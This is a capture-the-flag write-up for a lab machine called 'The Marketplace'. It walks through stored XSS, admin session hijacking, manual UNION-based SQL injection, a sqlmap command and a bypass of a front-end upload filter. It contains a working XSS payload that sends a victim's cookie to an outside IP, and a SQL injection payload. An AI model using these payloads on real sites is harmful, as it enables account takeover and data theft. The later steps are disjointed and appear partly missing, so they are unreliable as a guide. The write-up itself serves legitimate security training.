# The Marketplace

### The Marketplace
First create an account on the webpage (`test:test`), next step is to exploit a stored XSS vulnerability to steal michael's (the admin) cookie. The payload I used for XSS is `<script>new Image().src="http://10.11.127.156/steal.php?cookie=" + document.cookie;</script>`, if I open a python webserver on port 80 I get my own cookie. 
Luckily there's a button that allows me to report the listing to an admin, to make sure that his browser will view the XSS.<br />
![image](https://github.com/user-attachments/assets/8995c8e8-ec3c-4da0-b2fc-59ab16d5227d)<br />
So I report the listing and get the admin token on my webserver! The next step is to put it in the `cookie` variable from the developer's tools:<br />
![image](https://github.com/user-attachments/assets/5f76a337-1fb5-4c8e-9c44-baad24d55b4f)<br />
And now I have access to the `/admin` panel and got the first flag:<br />
![image](https://github.com/user-attachments/assets/4d42d3c0-14ca-4f8f-ad9a-eef41e8c8612)<br />
Now I need to get foothold on the machine. In the admin panel, I can select the "profile" of a user, and the URL becomes, for example, `/admin?user=1`. If I try to perform some SQL injection, I get this error: <br />
![image](https://github.com/user-attachments/assets/c53068ec-cd09-4f2e-b39f-6d4802b06d51)<br />
SQLMAP doesn't work, probably because there's some WAF that periodically changes michael's cookie. I need to exploit this SQL injection manually. First of all I need to know the number of columns of the table this query is about. After some enumeration the number of columns is `4`, because the payload that doesn't trigger an error is `?user=0 union select 1,2,3,4 -- -`:<br />
![Screenshot 2025-04-10 130639](https://github.com/user-attachments/assets/b250b695-0529-4b38-833b-a39a6eea8abf)<br />
As you can see the second column is reflected in the field `User`. This means that I can use it to enumerate the database.
sqlmap -r request.txt --batch --level 5 --risk 3 --dbs




and I think I need to work with the file upload. It is technically disabled, but it is just a front end filter. I can re-enable it by just deleting the `disabled` keyword from the html code in the developer's tools:<br />
![image](https://github.com/user-attachments/assets/44b21ce2-dad6-4bbc-8ec5-6e44b5fcde5f)<br />
Now, wappalyzer tells me that the web server is `express` and that the backup language is `node.js`:<br />
![image](https://github.com/user-attachments/assets/0f77507a-72d4-4946-b2ad-fe72eac83c74)<br />
This means that if I have to inject some kind of code to spawn a reverse shell it needs to be in `node.js`.

